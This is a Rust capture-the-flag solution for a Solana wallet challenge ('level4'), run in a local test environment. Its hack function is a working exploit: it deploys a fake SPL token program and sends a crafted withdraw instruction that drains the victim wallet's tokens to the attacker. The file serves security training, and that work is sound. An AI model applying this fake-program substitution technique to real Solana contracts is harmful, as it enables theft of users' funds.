use std::{env, str::FromStr};

use owo_colors::OwoColorize;
use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::spl_associated_token_account::get_associated_token_address;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};

use pocs::assert_tx_success;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
use solana_program::instruction::{AccountMeta, Instruction};
use level4::{get_authority, get_wallet_address, WalletInstruction};
use borsh::BorshSerialize;
use spl_token::state::Account;

struct Challenge {
    hacker: Keypair,
    wallet_program: Pubkey,
    wallet_address: Pubkey,
    wallet_owner: Pubkey,
    mint: Pubkey,
}

// Do your hacks in this function here
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // @note - Hack steps
    // 1) Load fake spl_token program
    // 2) Create empty wallet for hacker
    // 3) Create ata for hacker
    // 4) Withdrawal hacker wallet, swap source = hacker_wallet_address, destination = rich_boy_wallet , mint = spl_token::id()
    // 5) Withdrawal funds from hacker wallet to hacker ata

    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level4_poc_contract.so");
        dir.to_str()
    }
        .unwrap();
    let fake_spl_token_program_id = env.deploy_program(path);
    println!("fake_spl_token deployed {}", fake_spl_token_program_id);


    let hacker_init_wallet_ix = level4::initialize(challenge.wallet_program, challenge.hacker.pubkey(), challenge.mint);
    assert_tx_success(
        env.execute_as_transaction(
            &[hacker_init_wallet_ix],
            &[&challenge.hacker]
        )
    );


    let (authority_address, authority_seed) = get_authority(&challenge.wallet_program);
    let wallet_address = get_wallet_address(&challenge.hacker.pubkey(), &challenge.wallet_program).0;
    println!("hacker_wallet initialized {}", wallet_address);

    let hacker_ata_key = env.get_or_create_associated_token_account(&challenge.hacker, challenge.mint);
    let hacker_ata = env.get_unpacked_account::<Account>(hacker_ata_key).unwrap();
    println!("hacker_ata amount={}", hacker_ata.amount);
    let wallet_hacker = env.get_unpacked_account::<Account>(wallet_address).unwrap();
    println!("wallet_hacker amount={} , after init", wallet_hacker.amount);


    let exploit_withdrawal_ix = Instruction {
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(wallet_address, false), // source
            AccountMeta::new_readonly(authority_address, false), // authority
            AccountMeta::new_readonly(challenge.hacker.pubkey(), true),
            AccountMeta::new(challenge.wallet_address, false), // destination
            AccountMeta::new_readonly(spl_token::id(), false), // mint
            AccountMeta::new_readonly(fake_spl_token_program_id, false),
        ],
        data: WalletInstruction::Withdraw { amount: authority_seed as u64 }.try_to_vec().unwrap(),
    };

    assert_tx_success(
        env.execute_as_transaction(
            &[exploit_withdrawal_ix],
            &[&challenge.hacker]
        )
    );
    let wallet_hacker = env.get_unpacked_account::<Account>(wallet_address).unwrap();
    println!("wallet_hacker amount={} , after exploit withdrawal", wallet_hacker.amount);

    let hacker_withdrawal_ix = level4::withdraw(challenge.wallet_program, challenge.hacker.pubkey(), hacker_ata_key, challenge.mint, wallet_hacker.amount);
    assert_tx_success(
        env.execute_as_transaction(
            &[hacker_withdrawal_ix],
            &[&challenge.hacker]
        )
    );
    let hacker_ata = env.get_unpacked_account::<Account>(hacker_ata_key).unwrap();
    println!("hacker_ata amount={}, after hacker withdrawal", hacker_ata.amount);
}

/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    hack(&mut env, &challenge);
    verify(&mut env, challenge, internal);
}

struct Internal {
    wallet_owner: Keypair,
    wallet_amount: u64,
}

fn verify(env: &mut LocalEnvironment, challenge: Challenge, internal: Internal) {
    let tx = env.execute_as_transaction(
        &[level4::withdraw(
            challenge.wallet_program,
            challenge.wallet_owner,
            challenge.wallet_address,
            challenge.mint,
            internal.wallet_amount,
        )],
        &[&internal.wallet_owner],
    );

    tx.print_named("Verification: owner withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!("[*] {}", "Exploit not successful.".red());
    } else {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level4.so");
        dir.to_str()
    }
    .unwrap();

    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
    let wallet_owner = keypair(0);
    let rich_boi = keypair(1);
    let mint = keypair(2).pubkey();
    let rich_boi_ata = get_associated_token_address(&rich_boi.pubkey(), &mint);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(wallet_program, path)
        .add_account_with_lamports(
            wallet_owner.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
        .add_token_mint(mint, None, a_lot_of_money, 9, None)
        .add_associated_account_with_tokens(rich_boi.pubkey(), mint, a_lot_of_money)
        .build();

    let wallet_address = level4::get_wallet_address(&wallet_owner.pubkey(), &wallet_program).0;

    // Create Wallet
    assert_tx_success(env.execute_as_transaction(
        &[level4::initialize(
            wallet_program,
            wallet_owner.pubkey(),
            mint,
        )],
        &[&wallet_owner],
    ));

    println!("[*] Wallet created!");

    // rich boi pays for bill
    assert_tx_success(env.execute_as_transaction(
        &[level4::deposit(
            wallet_program,
            wallet_owner.pubkey(),
            rich_boi_ata,
            rich_boi.pubkey(),
            mint,
            a_lot_of_money,
        )],
        &[&rich_boi],
    ));
    println!("[*] rich boi payed his bills");

    (
        env,
        Challenge {
            wallet_address,
            hacker,
            wallet_program,
            wallet_owner: wallet_owner.pubkey(),
            mint,
        },
        Internal {
            wallet_owner,
            wallet_amount: a_lot_of_money,
        },
    )
}
